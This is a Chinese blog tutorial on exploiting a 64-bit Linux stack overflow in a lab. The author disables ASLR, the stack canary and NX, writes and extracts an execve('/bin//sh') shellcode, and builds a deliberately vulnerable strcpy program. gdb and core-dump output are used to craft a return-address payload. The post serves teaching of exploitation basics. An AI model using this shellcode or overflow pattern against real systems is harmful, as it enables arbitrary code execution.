---
title: 【pwn】linux x64栈溢出
date: 2017-10-11 16:42:01
categories: pwn
tags:
    - linux
    - 栈溢出
---

这篇文章主要记录基于64位linux的栈溢出实验，在实验过程中遇到的问题，以及自己的一些思考。

## 环境配置

实验基于Ubuntu 16.04, 操作系统版本以及gcc, gdb版本信息如下:

```
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x8664 x8664 x86_64 GNU/Linux

gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
```
<!-- more -->
为了更简单的方式实现栈溢出，需要关闭一些保护措施。

* ASLR(地址空间布局随机化)

  关闭ASLR：`sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`

* Cannary

  开启Canary之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 _stackchk_fail函数，终止进程。对应GCC编译选项`-fno-stack-protector`解除该保护。

* NX.
  开启NX保护之后，程序的堆栈将会不可执行。对应GCC编译选项`-z execstack`解除该保护。

### GCC 与gdb版本问题

gcc从4.8开始缺省使用了-gdwarf-4选项，较旧的gdb无法识别dwarf4版本的调试信息, 参见[https://gcc.gnu.org/gcc-4.8/changes.html](https://gcc.gnu.org/gcc-4.8/changes.html)。用gcc编译程序时，使用选项-gdwarf-3来指定生成dwarf3版本的调试信息，这样旧版的gdb就可以识别调试信息了。

综合上述信息，使用gcc编译，应当使用如下命令:

```Bash
gcc -fno-stack-protector -z execstack -gdwarf-3 xxx.c -o xxx
```

## 编写shellcode

对栈溢出的利用，通常是覆盖返回地址，指向自shellcode的地址，从而执行shellcode。因此，这里先解决shellcode的编写问题。参考：[https://www.exploit-db.com/exploits/36858/](https://www.exploit-db.com/exploits/36858/)。首先编写汇编文件，验证shellcode功能，然后再提取机器码。使用`AT&T`风格编写汇编文件如下：

```Asm
.global _start
_start:
    xor %esi, %esi
    # /bin//sh
    movabs $0x68732f2f6e69622f, %rbx
    push %rsi
    push %rbx
    push %rsp
    pop %rdi
    pushq $59
    pop %rax
    xor %edx, %edx
    syscall
```
{% asset_img 001.png%}

提取机器码:

```Bash
for i in $(objdump -d tmp | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05
```

## 编写栈溢出程序

```C
#include<stdio.h>
#include<string.h>

void overflow(char* str){
    char buf[128];
    strcpy(buf, str);
}

int main(){
    char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA";
    overflow(str);
    return 0;
}
```

上面这段程序栈溢出漏洞触发点在strcpy函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址，另外就是确定shellcode的地址即str的首地址，让返回地址指向该地址。

```bash
$gcc -fno-stack-protector -z execstack -gdwarf-3 pwn.c -o pwn
$gdb pwn
(gdb) start
Temporary breakpoint 1, main () at pwn.c:10
10	    char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAA";
(gdb) p /x $rsp
$4 = 0x7fffffffdc10
(gdb) p /x $rbp
$5 = 0x7fffffffdd10        # rbp rsp相差0x100, 即256,正是str申请的空间大小
(gdb) p /x &str
$3 = 0x7fffffffdc10		   # str首地址
(gdb) s
11	    overflow(str);
(gdb) s
overflow (str=0x7fffffffdc10 "1\366H\273/bin//shVST_j;X1\322\017\005 AAAAAAAA")
    at pwn.c:6
6	    strcpy(buf, str);
(gdb) p /x &buf
$7 = 0x7fffffffdb80
(gdb) p /x $rbp
$8 = 0x7fffffffdc00			# 0x7fffffffdc00 - 0x7fffffffdb80 = 128，即buf申请的空间大小
```

使用的shellcode长度为23字节，为了覆盖到返回地址，需要128+8(ebp)=136字节，则除了shellcode外还需要136-23=113填充字节。另外返回地址为0x7fffffffdd10,改为小端模式`\x10\xdc\xff\xff\xff\x7f`。那么payload为

```c
char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xdc\xff\xff\xff\x7f";
```

编译后运行程序，出现段错误，不符合预期，于是gdb调试。

```bash
$ ./pwn
段错误 (核心已转储)

(gdb) s
overflow (
    str=0x7fffffffdc10 "1\366H\273/bin//shVST_j;X1\322\017\005 ", 'A' <repeats 112 times>, "\020\334\377\377\377\177") at pwn.c:6
6	    strcpy(buf, str);
(gdb) n
7	}
(gdb) s
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x6e69622fbb48f631

0x00007fffffffdc10 in ?? ()
(gdb) p /x $rsp
$1 = 0x7fffffffdc10
(gdb) p /x $rbp
$2 = 0x4141414141414141
(gdb) p /x $rip
$3 = 0x7fffffffdc10
(gdb) x/32xg $rsp-0x10
0x7fffffffdc00:	0x4141414141414141	0x00007fffffffdc10
0x7fffffffdc10:	0x6e69622fbb48f631	0x5f54535668732f2f
0x7fffffffdc20:	0x20050fd231583b6a	0x4141414141414141
0x7fffffffdc30:	0x4141414141414141	0x4141414141414141
0x7fffffffdc40:	0x4141414141414141	0x4141414141414141
0x7fffffffdc50:	0x4141414141414141	0x4141414141414141
0x7fffffffdc60:	0x4141414141414141	0x4141414141414141
0x7fffffffdc70:	0x4141414141414141	0x4141414141414141
0x7fffffffdc80:	0x4141414141414141	0x4141414141414141
0x7fffffffdc90:	0x4141414141414141	0x00007fffffffdc10
0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcb0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcc0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000
0x7fffffffdce0:	0x0000000000000000	0x0000000000000000
0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
```

gdb查看rip, rsp, rbp都是正确的，然而实际运行却是段错误，网上搜索一番，原来是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，既然找到原因了，解决起来就比较容易了，只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。

一种方案是修改源程序，打印出str的首地址：`printf("%p\n", str);`;另外一种方案是利用内核转储获取真实内存地址，无须改变源码。

### GDB获取真实内存地址

首先启用内核转储：`ulimit -c unlimited`。该方法只在当前shell中生效，永久生效可以修改`/etc/profile`, 添加：`ulimit -c unlimited`。缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。

````
gdb <程序可执行文件> <coredump转储文件>
````

```Bash
$ulimit -c unlimited
$ ./pwn
段错误 (核心已转储)
$ gdb pwn core

Type "apropos word" to search for commands related to "word"...
Reading symbols from pwn...done.
[New LWP 11347]
Core was generated by `./pwn'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007fffffffdc10 in ?? ()
```
{% asset_img 003.png %}

从上图可以看出shellcode地址，修改payload为: 

```c
char str[256]="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xdc\xff\xff\xff\x7f";
```

重新编译运行。
{% asset_img 004.png %}

## 参考

* [https://www.exploit-db.com/docs/33698.pdf](https://www.exploit-db.com/docs/33698.pdf)
* [Linux 64-bit Buffer Overflow Tutorial](http://www.therabb1thole.co.uk/tutorial/linux-64-bit-buffer-overflow-tutorial/)
* [Where does Shellcode come from](http://www.therabb1thole.co.uk/tutorial/writing-linux-x86_64-bit-shellcode/)